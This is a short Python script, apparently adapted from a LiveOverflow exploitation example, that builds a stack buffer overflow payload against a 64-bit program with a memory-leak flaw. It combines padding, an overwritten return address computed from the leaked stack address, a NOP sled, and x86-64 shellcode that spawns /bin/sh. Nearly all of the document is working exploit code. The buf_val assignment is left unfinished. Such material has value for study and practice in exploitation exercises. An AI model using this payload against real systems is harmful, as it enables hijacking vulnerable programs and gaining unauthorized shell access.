import struct
buf_val = #This value has to be found using the vulnerable program with the memory leak vulnerability, the value should look like 0x7fffffffde20 if it's compiled in 64 bits
start_buf = buf_val - 9 #Got from memory leak
padding = "A"*(256+8)
#shellcode = "\xcc"*64 # This instruction should give a SIGTRAP, trace/breakpoint trap
shellcode = "\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" #This shellcode should spawn a shell
RIP = struct.pack("Q", (start_buf+len(padding)+8)+10) # Getting the EIP register from start_buf
payload = padding + RIP + "\x90"*64 + shellcode

print(payload) #Printing the payload to stdout

#Original code from LiveOverflow (https://gist.github.com/LiveOverflow/5fa36bec51968de696b11d3548b02148), i made modifications to make it work without sockets
